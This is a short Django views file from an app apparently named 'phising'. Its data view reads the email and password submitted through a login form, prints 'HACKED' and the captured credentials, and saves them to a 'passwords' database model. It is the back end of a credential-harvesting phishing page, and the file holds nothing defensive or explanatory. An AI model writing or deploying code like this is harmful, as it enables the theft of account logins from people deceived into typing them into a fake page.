from phising.models import passwords
from django.shortcuts import render,HttpResponse
from .models import passwords
# Create your views here.
def index(request):
    return render(request, 'index.html')

def data(request):
    if request.method == 'POST':
        print('HACKED')
        username= request.POST['email']
        password = request.POST['password']
        info = {
            'username':username,
            'password':password
        }
        print(info)
        passwords.objects.create(**info)

    return render(request, 'index.html')